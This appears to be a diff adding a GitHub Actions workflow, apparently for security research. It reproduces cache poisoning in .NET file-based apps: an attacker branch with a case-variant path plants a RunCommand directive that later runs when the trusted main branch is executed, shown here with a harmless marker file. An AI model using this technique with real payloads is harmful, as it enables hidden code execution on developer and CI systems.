@@ -1,0 +1,143 @@
+name: SDK file-app branch-switch cache poisoning
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-branch-switch-poison.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  branch-switch:
+    strategy:
+      fail-fast: false
+      matrix:
+        sdk:
+          - '10.0.401'
+          - '11.0.100-rc.1.26425.128'
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    name: branch-switch-${{ matrix.sdk }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Build malicious branch only, switch to trusted branch, then run
+        shell: bash
+        run: |
+          set -euxo pipefail
+
+          ROOT="$RUNNER_TEMP/sdk-fileapp-branch-switch"
+          MARKER="$RUNNER_TEMP/SDK_BRANCH_SWITCH_RUNCOMMAND.marker"
+          rm -rf "$ROOT"
+          rm -f "$MARKER"
+          mkdir -p "$ROOT"
+          cd "$ROOT"
+
+          git init
+          git config user.email "research@example.invalid"
+          git config user.name "Authorized Research"
+
+          mkdir -p src/VICTIM
+          cat > src/VICTIM/Program.cs <<'EOF'
+          Console.WriteLine("BRANCH_SWITCH_TRUSTED_MAIN_EXECUTED");
+          EOF
+          git add .
+          git commit -m "trusted main"
+          git branch -M main
+
+          git checkout -b attacker
+          mkdir -p src/victim
+          cat > src/victim/Program.cs <<EOF
+          #:property RunCommand=/usr/bin/touch
+          #:property RunArguments=$MARKER
+          Console.WriteLine("ATTACKER_SOURCE_BODY_SHOULD_NEVER_EXECUTE");
+          EOF
+          git rm src/VICTIM/Program.cs
+          rmdir src/VICTIM
+          git add .
+          git commit -m "attacker case-variant path"
+
+          ATTACKER="$ROOT/src/victim/Program.cs"
+          TRUSTED="$ROOT/src/VICTIM/Program.cs"
+
+          echo "=== Attacker branch: build only ==="
+          test -f "$ATTACKER"
+          test ! -e "$TRUSTED"
+
+          ATTACKER_HASH=$(python3 - "$ATTACKER" <<'PY'
+          import hashlib,sys
+          print(hashlib.sha256(sys.argv[1].upper().encode()).hexdigest())
+          PY
+          )
+          TRUSTED_HASH=$(python3 - "$TRUSTED" <<'PY'
+          import hashlib,sys
+          print(hashlib.sha256(sys.argv[1].upper().encode()).hexdigest())
+          PY
+          )
+          echo "ATTACKER_HASH=$ATTACKER_HASH"
+          echo "TRUSTED_HASH=$TRUSTED_HASH"
+          test "$ATTACKER_HASH" = "$TRUSTED_HASH"
+
+          dotnet build "$ATTACKER" > "$RUNNER_TEMP/branch-build.out" 2> "$RUNNER_TEMP/branch-build.err"
+          cat "$RUNNER_TEMP/branch-build.out"
+          cat "$RUNNER_TEMP/branch-build.err"
+          test ! -f "$MARKER"
+          echo "BRANCH_SWITCH_BUILD_ONLY_PRECONDITION=PASS"
+
+          echo "=== Switch back to trusted main ==="
+          git checkout main
+          test ! -e "$ATTACKER"
+          test -f "$TRUSTED"
+          echo "ATTACKER_SOURCE_GONE_AFTER_CHECKOUT=true"
+
+          echo "=== Run trusted main file ==="
+          rm -f "$MARKER"
+          dotnet run --file "$TRUSTED" > "$RUNNER_TEMP/branch-victim.out" 2> "$RUNNER_TEMP/branch-victim.err"
+          cat "$RUNNER_TEMP/branch-victim.out"
+          cat "$RUNNER_TEMP/branch-victim.err"
+
+          if test -f "$MARKER" && ! grep -q 'BRANCH_SWITCH_TRUSTED_MAIN_EXECUTED' "$RUNNER_TEMP/branch-victim.out"; then
+            echo "BRANCH_SWITCH_RESULT=ATTACKER_RUNCOMMAND_EXECUTED_ON_TRUSTED_MAIN"
+          else
+            echo "BRANCH_SWITCH_RESULT=FAILED"
+            exit 1
+          fi
+
+          echo "=== Cache removal control ==="
+          rm -f "$MARKER"
+          rm -rf "$HOME/.local/share/dotnet/runfile/Program-$TRUSTED_HASH"
+
+          dotnet run --file "$TRUSTED" > "$RUNNER_TEMP/branch-clean.out" 2> "$RUNNER_TEMP/branch-clean.err"
+          cat "$RUNNER_TEMP/branch-clean.out"
+          cat "$RUNNER_TEMP/branch-clean.err"
+
+          if grep -q 'BRANCH_SWITCH_TRUSTED_MAIN_EXECUTED' "$RUNNER_TEMP/branch-clean.out" && ! test -f "$MARKER"; then
+            echo "BRANCH_SWITCH_CACHE_REMOVAL_CONTROL=TRUSTED_MAIN_EXECUTED"
+          else
+            echo "BRANCH_SWITCH_CACHE_REMOVAL_CONTROL=FAILED"
+            exit 1
+          fi
+
+          cp "$RUNNER_TEMP/branch-build.out" "$GITHUB_WORKSPACE/branch-build-${{ matrix.sdk }}.out"
+          cp "$RUNNER_TEMP/branch-build.err" "$GITHUB_WORKSPACE/branch-build-${{ matrix.sdk }}.err"
+          cp "$RUNNER_TEMP/branch-victim.out" "$GITHUB_WORKSPACE/branch-victim-${{ matrix.sdk }}.out"
+          cp "$RUNNER_TEMP/branch-victim.err" "$GITHUB_WORKSPACE/branch-victim-${{ matrix.sdk }}.err"
+          cp "$RUNNER_TEMP/branch-clean.out" "$GITHUB_WORKSPACE/branch-clean-${{ matrix.sdk }}.out"
+          cp "$RUNNER_TEMP/branch-clean.err" "$GITHUB_WORKSPACE/branch-clean-${{ matrix.sdk }}.err"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: branch-switch-cache-poison-${{ matrix.sdk }}
+          path: |
+            branch-*.out
+            branch-*.err
